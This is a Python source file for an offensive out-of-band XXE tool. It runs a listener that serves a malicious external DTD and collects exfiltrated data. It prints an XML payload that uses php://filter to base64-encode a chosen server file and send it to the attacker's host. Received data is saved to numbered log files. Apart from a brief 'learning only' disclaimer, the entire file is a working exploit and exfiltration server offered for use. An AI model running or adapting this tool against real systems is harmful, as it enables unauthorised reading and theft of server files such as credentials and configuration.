
# @Мартин.
import argparse,textwrap,sys,requests,socket,threading,os,base64,re,datetime
Version = "@Мартин. XXE Tool V1.0.0"
Title='''
************************************************************************************
<免责声明>:本工具仅供学习实验使用,请勿用于非法用途,否则自行承担相应的法律责任
<Disclaimer>:This tool is only for learning and experiment. Do not use it for illegal purposes, or you will bear corresponding legal responsibilities
************************************************************************************'''
Logo = f'''
    __        __  __       __  __    __  __    __  ________  __    
   /  |      /  |/  \     /  |/  |  /  |/  |  /  |/        |/  \   
  /$$/      /$$/ $$  \   /$$ |$$ |  $$ |$$ |  $$ |$$$$$$$$/ $$  \  
 /$$/      /$$/  $$$  \ /$$$ |$$  \/$$/ $$  \/$$/ $$ |__     $$  \ 
/$$<      /$$/   $$$$  /$$$$ | $$  $$<   $$  $$<  $$    |     $$  |
$$  \    /$$/    $$ $$ $$/$$ |  $$$$  \   $$$$  \ $$$$$/      /$$/ 
 $$  \  /$$/     $$ |$$$/ $$ | $$ /$$  | $$ /$$  |$$ |_____  /$$/  
  $$  |/$$/      $$ | $/  $$ |$$ |  $$ |$$ |  $$ |$$       |/$$/   
   $$/ $$/       $$/      $$/ $$/   $$/ $$/   $$/ $$$$$$$$/ $$/    
                                        Github == > https: // github.com / MartinxMax
                                        {Version}
'''

def Get_LoackHost():
    if socket.gethostbyname(socket.gethostname()).startswith('127'):
        return os.popen("ifconfig eth0 | awk -F \"[^0-9.]+\" 'NR==2{print $2}'").read().strip()
    else:
        return socket.gethostbyname(socket.gethostname())

class XXE_Server():
    def __init__(self, args):
        self.Port = args.LPORT
        self.IP = args.LHOST
        self.RHOST = args.RHOST
        self.RPORT = args.RPORT
        self.URL = ((self.RHOST if "http" in self.RHOST else ("http://"+self.RHOST)) +":"+str(self.RPORT))if self.RHOST and self.RPORT else ((self.IP if "http" in self.IP else ("http://"+self.IP)) +":"+str(self.Port))
        self.FileID=0


    def run(self):
        self.Init_XXE_Server()


    def Init_XXE_Server(self):
        self.XXE_SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.XXE_SOCK.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.XXE_SOCK.bind(('', self.Port))
        self.XXE_SOCK.listen(100)
        print(f'[*]XXE_Server_Loading------[Success]')
        self.Show_Paylaod()
        self.Config_Main_DTD()
        self.Waiting_users()


    def Waiting_users(self):
        while True:
                Client_Socket, User_INFO = self.XXE_SOCK.accept()
                threading.Thread(target=self.Get_DATA, args=(Client_Socket, User_INFO)).start()


    def Config_Main_DTD(self):
        with open('./Main.dtd','r',encoding='utf-8')as f:
            self.Main_DTD_DATA = f.read().replace('@IP',self.URL)


    def Get_DATA(self,SOCK,ID):
        C_Data=None
        try:
            C_Data = SOCK.recv(8096).decode()
        except Exception as e:
            pass
        finally:

            if "data" in C_Data:
                try:
                    data = base64.b64decode(re.search(r'data=(?P<BASEDATA>.*?)H', C_Data).group('BASEDATA').strip())
                except Exception as E:
                    pass
                else:
                    if data:
                        self.Handle_Data(data)
            elif "Main.dtd" in C_Data:
                Header = "HTTP/1.1 200 OK\r\n"
                Header += f"Content-Length: {len(self.Main_DTD_DATA)}\r\n\r\n"
                Header += self.Main_DTD_DATA
                SOCK.send(Header.encode('utf-8'))
            SOCK.close()


    def Handle_Data(self,C_Data):
        with open(str(self.FileID)+".log",'wb')as f:
            f.write(C_Data)
            print(f"[+] Recv Data Save {str(self.FileID)}.log----[{datetime.datetime.now().strftime('%Y/%m/%d %H:%M:%S')}]")
            self.FileID+=1


    def Show_Paylaod(self):
        PAYLOAD = f'''
[+]PAYLOAD
<?xml version = "1.0"?>
<!DOCTYPE test [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=(File_Path)">
<!ENTITY % dtd SYSTEM "{self.URL}/Main.dtd">
%dtd;
%send;
]>
'''
        print(PAYLOAD)


def main():
    print(Logo,"\n",Title)
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=textwrap.dedent('''
        Example:
            author-Github==>https://github.com/MartinxMax
        Basic usage:
            python3 {XXEPY} -lh (0.0.0.0) -lp (8888) #These two parameters are optional, and the default port is 8888
            python3 {XXEPY} -rh (abc.com) -rp (xxxx) #These two parameters are required among the options. You can use TCP tunnel to deploy PAYLOAD in the public network
        
            '''.format(XXEPY = sys.argv[0]
                )))
    parser.add_argument('-lh', '--LHOST', default=Get_LoackHost(), help='My Host IP')
    parser.add_argument('-lp', '--LPORT', type=int,default=8888, help='My Host Port')
    parser.add_argument('-rh', '--RHOST', default=None, help='My Host IP')
    parser.add_argument('-rp', '--RPORT', type=int, default=None, help='My Host Port')
    args = parser.parse_args()
    XXE_Server(args).run()


if __name__ == '__main__':
    main()
